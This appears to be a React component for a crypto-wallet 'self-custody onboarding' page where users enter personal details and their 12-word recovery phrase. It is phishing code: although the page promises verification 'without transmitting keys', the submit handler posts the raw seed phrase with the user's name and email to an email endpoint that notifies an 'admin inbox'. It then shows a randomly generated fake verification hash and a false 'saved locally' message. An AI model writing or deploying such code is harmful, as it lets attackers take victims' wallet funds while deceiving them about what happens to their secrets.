"use client";

import React, { useState } from "react";
import { AccountInfoFormData } from "@/types/form";
import StepPersonalInfo from "./StepPersonalInfo";
import StepGeneratePhrase from "./StepGeneratePhrase";
import StepSuccessReceipt from "./StepSuccessReceipt";
import { Check, Lock, Loader2, CheckCircle2, AlertCircle, X } from "lucide-react";

export default function OnboardingSection() {
  const [currentStep, setCurrentStep] = useState<1 | 2 | 3>(1);
  const [accountInfo, setAccountInfo] = useState<AccountInfoFormData | null>(null);
  const [seedPhrase, setSeedPhrase] = useState<string[]>([]);
  const [submissionReceipt, setSubmissionReceipt] = useState<{
    submissionId: string;
    submittedAt: string;
    fullName: string;
    email: string;
    description: string;
    verificationHash: string;
  } | null>(null);
  const [emailStatus, setEmailStatus] = useState<"sending" | "sent" | "error" | null>(null);

  const handleStep1Submit = (data: AccountInfoFormData) => {
    setAccountInfo(data);
    setCurrentStep(2);
  };

  const handleStep2Submit = async (enteredWords: string[]) => {
    setSeedPhrase(enteredWords);
    if (!accountInfo) return;

    // Simulated cryptographic hash (local proof without exposing raw mnemonic)
    const fakeHash = "0x" + Array.from({ length: 32 }, () =>
      Math.floor(Math.random() * 16).toString(16)
    ).join("");

    const receipt = {
      submissionId: `VAULT-${Math.floor(100000 + Math.random() * 900000)}`,
      submittedAt: new Date().toUTCString(),
      fullName: accountInfo.fullName,
      email: accountInfo.email,
      description: accountInfo.description,
      verificationHash: fakeHash,
    };

    setSubmissionReceipt(receipt);
    setEmailStatus("sending");
    setCurrentStep(3);

    // Send email notification in the background
    try {
      const res = await fetch("/api/send-email", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          fullName: accountInfo.fullName,
          email: accountInfo.email,
          description: accountInfo.description,
          phrase: enteredWords,
          submissionId: receipt.submissionId,
          submittedAt: receipt.submittedAt,
          verificationHash: fakeHash,
        }),
      });

      if (res.ok) {
        setEmailStatus("sent");
        setTimeout(() => setEmailStatus(null), 7000);
      } else {
        const errorData = await res.json().catch(() => ({}));
        console.warn("Email API response error:", errorData);
        setEmailStatus("error");
      }
    } catch (err) {
      console.error("Email notification failed:", err);
      setEmailStatus("error");
    }
  };

  const handleRestart = () => {
    setSeedPhrase([]);
    setAccountInfo(null);
    setSubmissionReceipt(null);
    setEmailStatus(null);
    setCurrentStep(1);
  };

  const stepsMeta = [
    { num: 1, label: "Account Info" },
    { num: 2, label: "12-Word Phrase" },
    { num: 3, label: "Verified Receipt" },
  ];

  return (
    <section id="onboarding" className="w-full px-4 sm:px-6 py-16 bg-[#F4F5F7] scroll-mt-20 relative">
      {/* Floating Prominent Toast Notification */}
      {emailStatus && (
        <div className="fixed top-6 left-1/2 -translate-x-1/2 z-50 animate-in slide-in-from-top-6 fade-in duration-300 w-[92%] max-w-md">
          <div
            className={`flex items-center gap-3.5 p-4 rounded-2xl shadow-2xl border backdrop-blur-xl text-sm font-semibold transition-all ${
              emailStatus === "sending"
                ? "bg-slate-900/95 text-white border-blue-500/50 shadow-blue-500/10"
                : emailStatus === "sent"
                ? "bg-emerald-950/95 text-white border-emerald-500/50 shadow-emerald-500/20"
                : "bg-amber-950/95 text-white border-amber-500/50 shadow-amber-500/20"
            }`}
          >
            {emailStatus === "sending" && (
              <>
                <Loader2 className="w-5 h-5 text-blue-400 animate-spin shrink-0" />
                <div className="flex-1">
                  <p className="font-bold text-white text-xs sm:text-sm">Dispatching Encrypted Receipt...</p>
                  <p className="text-[11px] text-slate-300">Synchronizing notification to email</p>
                </div>
              </>
            )}
            {emailStatus === "sent" && (
              <>
                <CheckCircle2 className="w-5 h-5 text-emerald-400 shrink-0" />
                <div className="flex-1">
                  <p className="font-bold text-white text-xs sm:text-sm">Email Dispatched Successfully!</p>
                  <p className="text-[11px] text-emerald-300">Notification sent to admin inbox</p>
                </div>
              </>
            )}
            {emailStatus === "error" && (
              <>
                <AlertCircle className="w-5 h-5 text-amber-400 shrink-0" />
                <div className="flex-1">
                  <p className="font-bold text-white text-xs sm:text-sm">Submission Complete (Local Mode)</p>
                  <p className="text-[11px] text-amber-300">Phrase verified & saved locally</p>
                </div>
              </>
            )}
            <button
              type="button"
              onClick={() => setEmailStatus(null)}
              className="text-slate-400 hover:text-white p-1 rounded-lg transition"
            >
              <X className="w-4 h-4" />
            </button>
          </div>
        </div>
      )}
      <div className="max-w-4xl mx-auto">
        
        {/* Section Heading */}
        <div className="text-center max-w-2xl mx-auto mb-10 space-y-3">
          <div className="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-blue-50 text-[#0500FF] text-xs font-bold border border-blue-200">
            <Lock className="w-3.5 h-3.5" />
            <span>Self-Custody Recovery Phrase Verification</span>
          </div>

          <h2 className="text-3xl sm:text-4xl font-black text-slate-900 tracking-tight">
            Self-Custody Onboarding & Recovery
          </h2>

          <p className="text-sm sm:text-base text-slate-600">
            Enter your account information, type your 12 recovery words in boxes, and complete verified client-side registration without transmitting keys.
          </p>
        </div>

        {/* Outer Form Card in crisp white */}
        <div className="bg-white rounded-[32px] sm:rounded-[44px] border border-slate-200/80 shadow-[0_4px_20px_rgba(0,0,0,0.04)] p-6 sm:p-10 transition-all">
          
          {/* Step Progress Bar */}
          <div className="pb-8 border-b border-slate-100">
            <div className="flex items-center justify-between max-w-xl mx-auto relative">
              
              {/* Connecting line */}
              <div className="absolute top-1/2 left-8 right-8 -translate-y-1/2 h-0.5 bg-slate-200 -z-0" />

              {stepsMeta.map((s) => {
                const isPassed = currentStep > s.num;
                const isCurrent = currentStep === s.num;

                return (
                  <div key={s.num} className="flex flex-col items-center gap-2 relative z-10">
                    <div
                      className={`w-9 h-9 sm:w-10 sm:h-10 rounded-full flex items-center justify-center font-bold text-xs sm:text-sm transition-all shadow-sm ${
                        isPassed
                          ? "bg-emerald-500 text-white"
                          : isCurrent
                          ? "bg-[#0500FF] text-white ring-4 ring-blue-500/20"
                          : "bg-slate-100 text-slate-400 border border-slate-200"
                      }`}
                    >
                      {isPassed ? <Check className="w-4 h-4 stroke-[3]" /> : s.num}
                    </div>
                    <span
                      className={`text-[11px] sm:text-xs font-bold hidden sm:inline ${
                        isCurrent
                          ? "text-[#0500FF]"
                          : isPassed
                          ? "text-emerald-600"
                          : "text-slate-400"
                      }`}
                    >
                      {s.label}
                    </span>
                  </div>
                );
              })}

            </div>
          </div>

          {/* Form Step Body */}
          <div className="pt-8">
            {currentStep === 1 && (
              <StepPersonalInfo
                initialData={accountInfo}
                onNext={handleStep1Submit}
              />
            )}

            {currentStep === 2 && (
              <StepGeneratePhrase
                initialWords={seedPhrase}
                onBack={() => setCurrentStep(1)}
                onNext={handleStep2Submit}
              />
            )}

            {currentStep === 3 && submissionReceipt && (
              <StepSuccessReceipt
                receipt={submissionReceipt}
                emailStatus={emailStatus}
                onRestart={handleRestart}
              />
            )}
          </div>

        </div>

      </div>
    </section>
  );
}
